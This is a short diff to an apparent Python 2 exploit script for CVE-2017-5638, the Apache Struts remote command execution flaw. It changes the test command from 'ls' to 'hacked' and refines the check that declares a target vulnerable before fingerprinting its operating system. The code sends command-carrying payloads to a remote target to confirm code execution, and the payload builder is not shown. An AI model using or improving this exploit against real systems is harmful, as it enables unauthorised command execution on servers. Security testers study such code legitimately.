@@ -85,7 +85,7 @@ class CVE_2017_5638():
     def send_xpl(self, p_payload):
         body = ''
         try:
-            # Set proxy for debug request, just uncomment these lines 
+            # Set proxy for debug request, just uncomment these lines
             # Change the proxy port
 
             #proxy = urllib2.ProxyHandler({'http': '127.0.0.1:8081'})
@@ -113,11 +113,11 @@ class CVE_2017_5638():
             print '[+] Windows OS system detected.\n'
 
     def test_vuln(self):
-        cmd = 'ls'
+        cmd = 'hacked'
         print '\n[+] Testing ' + self.target
         resp = self.send_xpl(self.generate_payload(cmd))
         tags = ['<html', '<head', '<body', '<script', '<div']
-        if any(tag not in resp.lower() for tag in tags):
+        if any(tag not in resp.lower() for tag in tags) and cmd in resp:
             print '[+] Target possibly vulnerable'
             print '[+] Finger printing OS system..'
             self.os_detect()
